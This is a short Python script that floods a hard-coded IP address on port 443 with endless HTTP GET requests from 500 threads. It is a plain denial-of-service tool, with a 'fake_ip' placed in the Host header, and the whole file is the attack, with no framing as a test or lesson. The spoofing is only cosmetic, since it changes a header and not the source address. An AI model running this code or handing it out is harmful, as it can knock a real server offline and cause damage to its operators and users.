import socket
import threading

target = "38.65.128.101"
port = 443
Trd = 500
fake_ip = '172.16.12.23'
#global attack_num
#attack_num = 0
def attack():
 while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
    s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
    s.close()
    #attack_num += 1
    #print(attack_num)

for i in range(Trd):
 thread = threading.Thread(target=attack)
 thread.start()
 
